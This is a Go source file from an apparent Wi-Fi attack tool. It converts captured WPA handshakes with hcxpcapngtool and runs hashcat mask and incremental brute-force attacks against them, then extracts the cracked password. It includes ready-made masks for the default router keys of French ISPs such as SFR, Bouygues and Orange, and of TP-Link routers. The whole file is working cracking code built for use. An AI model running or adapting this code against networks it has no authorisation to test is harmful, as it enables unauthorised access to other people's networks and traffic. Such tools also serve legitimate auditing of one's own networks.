package wifi

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// BruteforceMode defines the attack mode
type BruteforceMode string

const (
	ModeWordlist  BruteforceMode = "wordlist"  // Classic dictionary attack
	ModeMask      BruteforceMode = "mask"      // Hashcat mask attack (pattern-based)
	ModeHybrid    BruteforceMode = "hybrid"    // Dictionary + rules
	ModeIncrement BruteforceMode = "increment" // Incremental brute force
)

// BruteforceConfig holds configuration for a bruteforce attack
type BruteforceConfig struct {
	CapturePath string         `json:"capture_path"`
	BSSID       string         `json:"bssid"`
	SSID        string         `json:"ssid"`
	Mode        BruteforceMode `json:"mode"`
	// For wordlist mode
	WordlistPath string `json:"wordlist_path,omitempty"`
	// For mask mode (hashcat)
	MaskPattern   string `json:"mask_pattern,omitempty"`
	CustomCharset string `json:"custom_charset,omitempty"`
	// For increment mode
	MinLength   int    `json:"min_length,omitempty"`
	MaxLength   int    `json:"max_length,omitempty"`
	CharsetType string `json:"charset_type,omitempty"` // digits, lower, upper, alpha, alnum, all
	// ISP-specific
	ISP string `json:"isp,omitempty"`
}

// BruteforceState tracks the state of a running bruteforce attack
type BruteforceState struct {
	Running     bool              `json:"running"`
	Mode        BruteforceMode    `json:"mode"`
	CapturePath string            `json:"capture_path"`
	SSID        string            `json:"ssid"`
	BSSID       string            `json:"bssid"`
	StartedAt   time.Time         `json:"started_at"`
	KeysTested  int64             `json:"keys_tested"`
	KeysPerSec  float64           `json:"keys_per_sec"`
	Progress    float64           `json:"progress_percent"`
	EstTimeLeft string            `json:"estimated_time_left"`
	Result      *BruteforceResult `json:"result,omitempty"`
	cmd         *exec.Cmd
	cancel      context.CancelFunc
}

// HashcatCharsets defines hashcat character sets
var HashcatCharsets = map[string]string{
	"digits":    "?d",   // 0-9
	"lower":     "?l",   // a-z
	"upper":     "?u",   // A-Z
	"alpha":     "?l?u", // a-zA-Z (custom)
	"alnum":     "?a",   // a-zA-Z0-9 (hashcat built-in)
	"hex_lower": "?h",   // 0-9a-f
	"hex_upper": "?H",   // 0-9A-F
	"special":   "?s",   // special chars
	"all":       "?a",   // all printable
}

// ISP-specific mask patterns for hashcat
var ISPMasks = map[string][]MaskConfig{
	"Free": {
		{
			Name:          "Freebox mots latins courts",
			Description:   "4 mots latins (5-8 lettres chacun) séparés par tirets + suffixes",
			Mask:          "?l?l?l?l?l-?l?l?l?l?l?l-?l?l?l?l?l?l-?l?l?l?l?l",
			Complexity:    "wordlist_required",
			EstimatedKeys: 1e40, // Trop grand pour mask pur - utiliser wordlist
			Notes:         "Le mode Pattern seul est inefficace pour Freebox. Utilisez la wordlist latin-words.txt",
		},
	},
	"Orange": {
		{
			Name:          "Livebox 26 hex",
			Description:   "26 caractères hexadécimaux (anciennes Livebox)",
			Mask:          strings.Repeat("?H", 26),
			Complexity:    "very_high",
			EstimatedKeys: 1.6e31,
		},
	},
	"SFR": {
		{
			Name:          "SFR Box 12 alphanum",
			Description:   "12 caractères alphanumériques majuscules",
			Mask:          "?u?u?u?d?d?d?u?u?u?d?d?d",
			Complexity:    "high",
			EstimatedKeys: 4.7e18,
		},
		{
			Name:          "SFR Box 8 alphanum",
			Description:   "8 caractères (anciennes box)",
			Mask:          strings.Repeat("?1", 8),
			CustomCharset: "?u?d", // uppercase + digits
			Complexity:    "medium",
			EstimatedKeys: 2.8e12,
		},
	},
	"Bouygues": {
		{
			Name:          "Bbox 8 alphanum",
			Description:   "8 caractères alphanumériques",
			Mask:          strings.Repeat("?1", 8),
			CustomCharset: "?l?u?d", // lower + upper + digits
			Complexity:    "medium",
			EstimatedKeys: 2.2e14,
		},
	},
	"TP-Link": {
		{
			Name:          "TP-Link 8 digits",
			Description:   "8 chiffres",
			Mask:          "?d?d?d?d?d?d?d?d",
			Complexity:    "low",
			EstimatedKeys: 1e8,
		},
	},
}

// MaskConfig defines a hashcat mask configuration
type MaskConfig struct {
	Name          string  `json:"name"`
	Description   string  `json:"description"`
	Mask          string  `json:"mask"`
	CustomCharset string  `json:"custom_charset,omitempty"`
	Notes         string  `json:"notes,omitempty"`
	Complexity    string  `json:"complexity"` // low, medium, high, very_high
	EstimatedKeys float64 `json:"estimated_keys"`
}

// GetMasksForISP returns available mask configurations for an ISP
func GetMasksForISP(isp string) []MaskConfig {
	if masks, ok := ISPMasks[isp]; ok {
		return masks
	}
	return nil
}

// ConvertCapToHashcat converts a .cap file to hashcat format (.hc22000)
func ConvertCapToHashcat(capPath string) (string, error) {
	// Output path
	hcPath := strings.TrimSuffix(capPath, filepath.Ext(capPath)) + ".hc22000"

	// Check if hcxpcapngtool is installed
	hcxPath := findTool("hcxpcapngtool")
	if hcxPath == "" {
		return "", fmt.Errorf("hcxpcapngtool not found. Install with: sudo apt install hcxtools")
	}

	// Convert
	cmd := exec.Command(hcxPath, "-o", hcPath, capPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("conversion failed: %v - %s", err, string(output))
	}

	// Check if file was created
	if _, err := os.Stat(hcPath); err != nil {
		return "", fmt.Errorf("no handshake found in capture file")
	}

	return hcPath, nil
}

// RunMaskAttack runs a hashcat mask attack on a capture file
func RunMaskAttack(ctx context.Context, config BruteforceConfig, progressChan chan<- BruteforceState) (*BruteforceResult, error) {
	// Find hashcat
	hashcatPath := findTool("hashcat")
	if hashcatPath == "" {
		return nil, fmt.Errorf("hashcat not found. Install with: sudo apt install hashcat")
	}

	// Convert .cap to hashcat format if needed
	hcPath := config.CapturePath
	if strings.HasSuffix(config.CapturePath, ".cap") {
		var err error
		hcPath, err = ConvertCapToHashcat(config.CapturePath)
		if err != nil {
			return nil, err
		}
	}

	// Get mask from config or ISP
	mask := config.MaskPattern
	customCharset := config.CustomCharset

	if mask == "" && config.ISP != "" {
		masks := GetMasksForISP(config.ISP)
		if len(masks) > 0 {
			mask = masks[0].Mask
			customCharset = masks[0].CustomCharset
		}
	}

	if mask == "" {
		return nil, fmt.Errorf("no mask pattern specified")
	}

	// Build hashcat command
	// -m 22000 = WPA-PBKDF2-PMKID+EAPOL
	// -a 3 = brute-force (mask attack)
	args := []string{
		"-m", "22000",
		"-a", "3",
		"--status",
		"--status-timer=5",
		"-o", hcPath + ".cracked",
	}

	// Add custom charset if specified
	if customCharset != "" {
		args = append(args, "-1", customCharset)
	}

	args = append(args, hcPath, mask)

	cmd := exec.CommandContext(ctx, hashcatPath, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	// Capture output for progress
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, err
	}

	startTime := time.Now()
	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("failed to start hashcat: %v", err)
	}

	// Parse progress from hashcat output
	go func() {
		scanner := bufio.NewScanner(stdout)
		progressRegex := regexp.MustCompile(`Progress\.+:\s+(\d+)/(\d+)`)
		speedRegex := regexp.MustCompile(`Speed\.#1\.+:\s+([\d.]+)\s+(\w+/s)`)
		timeRegex := regexp.MustCompile(`Time\.Estimated\.+:\s+(.+)`)

		for scanner.Scan() {
			line := scanner.Text()

			state := BruteforceState{
				Running:     true,
				Mode:        ModeMask,
				CapturePath: config.CapturePath,
				SSID:        config.SSID,
				BSSID:       config.BSSID,
				StartedAt:   startTime,
			}

			if match := progressRegex.FindStringSubmatch(line); len(match) > 2 {
				tested, _ := strconv.ParseInt(match[1], 10, 64)
				total, _ := strconv.ParseInt(match[2], 10, 64)
				state.KeysTested = tested
				if total > 0 {
					state.Progress = float64(tested) / float64(total) * 100
				}
			}

			if match := speedRegex.FindStringSubmatch(line); len(match) > 1 {
				speed, _ := strconv.ParseFloat(match[1], 64)
				state.KeysPerSec = speed
			}

			if match := timeRegex.FindStringSubmatch(line); len(match) > 1 {
				state.EstTimeLeft = match[1]
			}

			if progressChan != nil {
				select {
				case progressChan <- state:
				default:
				}
			}
		}
	}()

	// Wait for completion
	err = cmd.Wait()
	duration := time.Since(startTime)

	result := &BruteforceResult{
		SSID:     config.SSID,
		BSSID:    config.BSSID,
		Capture:  config.CapturePath,
		Duration: duration.Seconds(),
		TestedAt: time.Now(),
	}

	// Check if password was cracked
	crackedFile := hcPath + ".cracked"
	if data, err := os.ReadFile(crackedFile); err == nil && len(data) > 0 {
		// Format: hash:password
		parts := strings.Split(string(data), ":")
		if len(parts) >= 2 {
			result.Success = true
			result.Password = strings.TrimSpace(parts[len(parts)-1])
		}
	}

	if err != nil && ctx.Err() == nil && !result.Success {
		// Hashcat returns non-zero exit codes for various reasons
		// including "no password found" which isn't really an error
		result.Success = false
	}

	return result, nil
}

// RunIncrementalAttack runs a brute-force attack with increasing lengths
func RunIncrementalAttack(ctx context.Context, config BruteforceConfig, progressChan chan<- BruteforceState) (*BruteforceResult, error) {
	// Find hashcat
	hashcatPath := findTool("hashcat")
	if hashcatPath == "" {
		return nil, fmt.Errorf("hashcat not found")
	}

	// Convert .cap to hashcat format if needed
	hcPath := config.CapturePath
	if strings.HasSuffix(config.CapturePath, ".cap") {
		var err error
		hcPath, err = ConvertCapToHashcat(config.CapturePath)
		if err != nil {
			return nil, err
		}
	}

	// Determine charset
	charset := "?a" // default: all printable
	if config.CharsetType != "" {
		if c, ok := HashcatCharsets[config.CharsetType]; ok {
			charset = c
		}
	}

	minLen := config.MinLength
	if minLen <= 0 {
		minLen = 8 // WPA minimum
	}

	maxLen := config.MaxLength
	if maxLen <= 0 {
		maxLen = 12
	}

	// Build mask with incrementing length
	// --increment enables incremental mode
	// --increment-min and --increment-max set the range
	mask := strings.Repeat(charset, maxLen)

	args := []string{
		"-m", "22000",
		"-a", "3",
		"--increment",
		"--increment-min", strconv.Itoa(minLen),
		"--increment-max", strconv.Itoa(maxLen),
		"--status",
		"--status-timer=5",
		"-o", hcPath + ".cracked",
		hcPath,
		mask,
	}

	cmd := exec.CommandContext(ctx, hashcatPath, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	startTime := time.Now()
	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("failed to start hashcat: %v", err)
	}

	err := cmd.Wait()
	duration := time.Since(startTime)

	result := &BruteforceResult{
		SSID:     config.SSID,
		BSSID:    config.BSSID,
		Capture:  config.CapturePath,
		Duration: duration.Seconds(),
		TestedAt: time.Now(),
	}

	// Check if password was cracked
	crackedFile := hcPath + ".cracked"
	if data, err := os.ReadFile(crackedFile); err == nil && len(data) > 0 {
		parts := strings.Split(string(data), ":")
		if len(parts) >= 2 {
			result.Success = true
			result.Password = strings.TrimSpace(parts[len(parts)-1])
		}
	}

	if err != nil && ctx.Err() == nil && !result.Success {
		result.Success = false
	}

	return result, nil
}

// GenerateMaskFromPattern creates a hashcat mask from a pattern description
func GenerateMaskFromPattern(pattern PasswordPattern) string {
	if pattern.MaskPattern != "" {
		return pattern.MaskPattern
	}

	// Try to infer mask from character set and length
	length := 8 // default
	if pattern.Length != "" {
		// Parse length (could be "8", "8-12", etc.)
		if strings.Contains(pattern.Length, "-") {
			parts := strings.Split(pattern.Length, "-")
			if len(parts) == 2 {
				maxLen, _ := strconv.Atoi(parts[1])
				length = maxLen
			}
		} else {
			length, _ = strconv.Atoi(pattern.Length)
		}
	}

	charset := "?a"
	switch strings.ToLower(pattern.CharacterSet) {
	case "hex", "hex (0-9, a-f)":
		charset = "?H"
	case "digits", "numeric":
		charset = "?d"
	case "uppercase alphanumeric":
		charset = "?1" // needs custom charset ?u?d
	case "alphanumeric":
		charset = "?a"
	case "lowercase":
		charset = "?l"
	}

	return strings.Repeat(charset, length)
}

// EstimateAttackTime estimates how long an attack will take
func EstimateAttackTime(mask string, keysPerSecond float64) time.Duration {
	if keysPerSecond <= 0 {
		keysPerSecond = 50000 // Conservative estimate for WPA on CPU
	}

	// Count keyspace
	keyspace := float64(1)
	for i := 0; i < len(mask); i += 2 {
		if i+2 <= len(mask) {
			switch mask[i : i+2] {
			case "?d":
				keyspace *= 10
			case "?l":
				keyspace *= 26
			case "?u":
				keyspace *= 26
			case "?a":
				keyspace *= 62
			case "?H":
				keyspace *= 16
			case "?h":
				keyspace *= 16
			case "?s":
				keyspace *= 33
			case "?1", "?2", "?3", "?4":
				keyspace *= 36 // approximate for custom charsets
			default:
				keyspace *= 95 // all printable
			}
		}
	}

	seconds := keyspace / keysPerSecond
	return time.Duration(seconds) * time.Second
}

// CheckHashcatInstalled verifies hashcat and hcxtools are available
func CheckHashcatInstalled() map[string]bool {
	return map[string]bool{
		"hashcat":       checkToolInstalled("hashcat"),
		"hcxpcapngtool": checkToolInstalled("hcxpcapngtool"),
		"hcxdumptool":   checkToolInstalled("hcxdumptool"),
	}
}
